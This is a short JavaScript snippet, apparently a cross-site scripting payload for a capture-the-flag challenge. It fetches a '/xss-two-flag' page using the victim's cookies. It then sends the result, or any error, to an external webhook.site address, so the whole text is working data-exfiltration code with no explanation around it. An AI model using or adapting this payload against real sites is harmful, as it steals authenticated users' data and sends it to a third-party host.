fetch(window.location.origin + '/xss-two-flag', { credentials: 'include' })
  .then(r => r.text())
  .then(flag =>
    fetch(
      'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?flag=' + encodeURIComponent(flag),
      { mode: 'no-cors' }
    )
  )
  .catch(err =>
    fetch(
      'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?err=' + encodeURIComponent(String(err)),
      { mode: 'no-cors' }
    )
  );
